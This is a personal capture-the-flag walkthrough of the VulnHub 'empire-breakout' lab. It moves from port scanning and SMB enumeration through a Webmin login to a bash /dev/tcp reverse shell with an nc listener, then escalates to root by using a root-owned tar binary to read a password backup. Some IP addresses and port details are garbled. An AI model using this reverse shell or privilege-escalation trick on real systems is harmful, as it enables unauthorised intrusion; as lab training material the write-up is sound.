
# Introduction

Hi Folks, in this documentation, i will share with you about this lab (empire-breakout). Empire-breakout is lab privoded by VulnHub. if you wanna try this lab, you can visit the original site in VulnHub.

# Settings Up

After that, import the .vdi file of empire-breakout to the virtual box. Do not forget to change the network of machine to bridge. So the machine also can connect to my kali linux machine in virtual box.

# Discover and Identify weaknesses

Then run the machine and first thing that i see after starting the machine is the IP Address and login to the machine. In this case, My machine has 192.168.1.15 IP Address and username, password login.

And how i can login if i don't know the username and password ? So, After that, I'll try to scanning all ports of machine which ports are open in the machine using nmap tools.

Then, I started to open my linux terminal and type this commands: 

```
nmap -p- -A -T4 192/168.15

-p- : scanning all ports
-A  : enable OS detection, version detection, script scanning, and traceroute
-T4 : Set timing template (higher is faster)

```

Results

```
PORT        STATE   SERVICE     VERSION
80/tcp      open    http        Apache httpd 2.4.51
139/tcp     open    netbios-ssn Samba smbd 4.6.2
443/tcp     open    netbios-ssn Samba smbd 4.6.2
10000/tcp   open    http        MiniServ 1.981 (Webmin httpd)
20000/tcp   open    http        MiniServ 1.830 (Webmin httpd)

and other information about the machine

```

In this case, we know that the 192.168.1.15 IP address can be opened from browser. Try to open it in the browser and view the source code and i get brainfuck-language and try to decrypt it. 

And then try to search in google, if port 139/tcp, 443/tcp, 10000/tcp, 20000/tcp can be exploited.

# SMB Enumeration

After looking for exploit, i got good articles that ports 139/tcp, 443/tcp can be exploit. https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb

First thing i do after read the articles is obtain all information of smb machine using this command and got unique information which user to login to Webmin or Usermin

```
enum4linux 192.168.1.15

S-1-22-1-1000 Unix User\cyber (Local User)                         
```

After we got all information about machine such as username and password, Try to login to 192.168.1.15:10000 or 192.168.1.20000. After login to the page, try to find terminal and see what inside. Yeah, in this case i got two files as cyber user, the files are tar and user.txt. 
Open user.txt file and get 
```
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```

But, in this case i still login as cyber user from pages or browser 192.168.1.15:20000. Then, how to login to the real machine or server ? 

As i know, from the page we have Mail and Usermin tab.
Try to find command shell from the tabs and do reverse shell. To reverse shell, we need to know the commands, and i try to use the commands from PayloadAllTheThings.
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

```
bash -i >& /dev/tcp/listen_ip/any_port 0>&1
bash -i >& /dev/tcp/192.168.1.18/1337 0>&1 (in this case)
```

Before running the above command, i need to listen first in my main linux machine or kali linux machine with below command and then run the above command

```
nc -nlvp 1337
```

After that, you will get reverse shell and try to find unique information from the server. So, i try to open /var folders and there is backups folder. When i open it, there is .old_pass.bak file which interesting file but i cannot open it.

So I try to move to directory home server again and list all files and there is tar file that link to root.

When i try to execute tar, so it the real command but the owner of tar is root. SO, i think i can try to tar the .old_pass.bak file and try to extracta again with this command. 

```
./tar -cf backup.tar /var/backups/.old_pass.bak (archieve the file)

./tar -xf backup.tar (extract var directory)

```

As you can see, i can archieve the .old_pass.bak file and try to extract once more using tar binary executables file. And try to open it as usual using cd and cat commands. 

```
cd var/backups (backups directory)
cat .old_pass.bak (root password)
```

After got the root password, I try to login to root using below commands

```
su root
Password: ***********
```

yeah, Now i am the root. I try to looking for unique information from the root and get rOOT.txt file. This file shows me that i have been successfull to break the system as root.. mwehehehe

Thank you for watching and my bad english. I will keep update these sentences so that becomes correct sentences.

감사합니다

